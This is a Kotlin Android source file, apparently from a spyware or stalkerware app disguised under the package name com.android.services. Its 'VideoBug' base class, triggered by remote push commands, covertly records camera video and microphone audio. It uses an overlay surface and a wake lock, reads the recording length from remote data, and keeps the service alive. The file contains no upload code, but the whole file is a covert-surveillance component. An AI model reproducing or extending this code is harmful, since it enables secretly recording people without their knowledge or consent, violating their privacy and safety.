package com.android.services.services.videoBug

import android.app.Service
import android.content.Context
import android.content.Intent
import android.hardware.camera2.*
import android.media.MediaCodec
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.PowerManager
import android.util.Range
import android.view.Surface
import android.view.WindowManager
import androidx.annotation.RequiresApi
import com.android.services.enums.FcmPushStatus
import com.android.services.interfaces.IBackgroundProcessing
import com.android.services.models.VideoBugCommand
import com.android.services.util.AppUtils
import com.android.services.util.AutoFitSurfaceView
import com.android.services.util.OrientationLiveData
import com.android.services.util.logVerbose
import io.reactivex.rxjava3.disposables.Disposable
import java.io.File
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors


@RequiresApi(Build.VERSION_CODES.LOLLIPOP)
abstract class VideoBugCommandProcessingBase(val applicationContext: Context) :
    IBackgroundProcessing {

    /** Where the camera preview is displayed */
    protected lateinit var viewFinder: AutoFitSurfaceView
    protected lateinit var mWindowManager: WindowManager

    protected val windowManagerFlagOverlay =
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY else
            WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

    internal val executorService: ExecutorService = Executors.newSingleThreadExecutor()
    internal var disposable: Disposable? = null
    internal var mRecordingStartTime: Long = 0
    internal var wakeLock: PowerManager.WakeLock? = null
    internal var videoBugPush: VideoBugCommand? = null
    internal var customData="15"

    /** Creates an output [File] Path in External Storage Directory For Recording */
    protected val mFilePath: String by lazy {
        createOutputFilePath()
    }

    /** Saves the video recording */
    protected val recorder: MediaRecorder by lazy { createRecorder(recorderSurface) }

    /** Detects, characterizes, and connects to a CameraDevice (used for all camera operations) */
    protected val cameraManager: CameraManager by lazy {
        applicationContext.getSystemService(Context.CAMERA_SERVICE) as CameraManager
    }

    protected val cameraId: String by lazy {
        AppUtils.findCameraById(videoBugPush!!.cameraOption).toString()
    }

    /** [CameraCharacteristics] corresponding to the provided Camera ID */
    protected val characteristics: CameraCharacteristics by lazy {
        cameraManager.getCameraCharacteristics(cameraId)
    }

    /**
     * Setup a persistent [Surface] for the recorder so we can use it as an output target for the
     * camera session without preparing the recorder
     */
    protected val recorderSurface: Surface by lazy {
        // Get a persistent Surface from MediaCodec, don't forget to release when done
        val surface = MediaCodec.createPersistentInputSurface()
        // Prepare and release a dummy MediaRecorder with our new surface
        // Required to allocate an appropriately sized buffer before passing the Surface as the
        //  output target to the capture session
        createRecorder(surface).apply {
            prepare()
            release()
        }
        surface
    }

    /** Live data listener for changes in the device orientation relative to the camera */
    protected lateinit var relativeOrientation: OrientationLiveData

    /** Creates a [MediaRecorder] instance using the provided [Surface] as input */
    private fun createRecorder(surface: Surface) = MediaRecorder().apply {
        setAudioSource(MediaRecorder.AudioSource.MIC)
        setVideoSource(MediaRecorder.VideoSource.SURFACE)
        setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
        setOutputFile(mFilePath)
        setVideoEncodingBitRate(RECORDER_VIDEO_BITRATE)
        setVideoFrameRate(30)
        setVideoSize(640, 480)
        setVideoEncoder(MediaRecorder.VideoEncoder.H264)
        setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
        setMaxDuration(getVideoBugDuration())
        setInputSurface(surface)

        setOnInfoListener { _, what, _ ->
            logVerbose("MediaRecorder Info: $what")
            if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
                videoBugStatus = FcmPushStatus.SUCCESS.getStatus()
                stopRecording()
            } else {
                stopRecording()
            }
        }

        setOnErrorListener { mr, what, extra ->
            logVerbose("MediaRecorder Error: $what")
            videoBugStatus = FcmPushStatus.FILE_CORRUPTED.getStatus()
            stopRecording()
        }
    }

    /** Get the Video Bug duration in Milliseconds**/
    private fun getVideoBugDuration(): Int {
        return when (customData) {
            "1" -> {
                60 * 1000
            }
            else -> {
                customData.toInt() * 1000
            }
        }
    }

    /** Captures frames from a [CameraDevice] for our video recording */
    protected lateinit var session: CameraCaptureSession

    /** The [CameraDevice] that will be opened in this fragment */
    protected lateinit var camera: CameraDevice

    /** Requests used for preview only in the [CameraCaptureSession] */
    protected val previewRequest: CaptureRequest by lazy {
        // Capture request holds references to target surfaces
        session.device.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
            // Add the preview surface target
            addTarget(viewFinder.holder.surface)
        }.build()
    }

    /** Requests used for preview and recording in the [CameraCaptureSession] */
    protected val recordRequest: CaptureRequest by lazy {
        // Capture request holds references to target surfaces
        session.device.createCaptureRequest(CameraDevice.TEMPLATE_RECORD).apply {
            // Add the preview and recording surface targets
            addTarget(viewFinder.holder.surface)
            addTarget(recorderSurface)
            // Sets user requested FPS for all targets
            set(CaptureRequest.CONTROL_AE_TARGET_FPS_RANGE, Range(30, 30))
        }.build()
    }

    /** [HandlerThread] where all camera operations run */
    protected val cameraThread = HandlerThread("CameraThread").apply { start() }

    /** [Handler] corresponding to [cameraThread] */
    protected val cameraHandler = Handler(cameraThread.looper)

    companion object {
        internal const val TAG = "VideoBug"
        internal const val RECORDER_VIDEO_BITRATE: Int = 8_00_000
        internal const val MIN_REQUIRED_RECORDING_TIME_MILLIS: Long = 1000L
        internal const val TAG_VIDEO_BUG_WAKE_LOCK = "myApp:TOSVideoBugWork"
        const val VIDEO_BUG_PUSH = "VIDEO_BUG_PUSH"
        internal const val PERIODIC_INTERVAL = 60 * 1000L
        internal var intervalConsumed: Int = 0
        internal const val VIDEO_BUG_NOTIFICATION_ID = 114

        @JvmStatic
        var videoBugStatus: String? = null
    }

    abstract fun initialize()
    abstract fun parseIntent(intent: Intent?)
    abstract fun createOutputFilePath(): String
    abstract fun stopRecording()
    abstract fun onServiceDestroy()

    override fun onCreate() {
        initialize()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        createOutputFilePath()
        parseIntent(intent)
        return Service.START_REDELIVER_INTENT
    }

    override fun onDestroy() {
        onServiceDestroy()
    }
}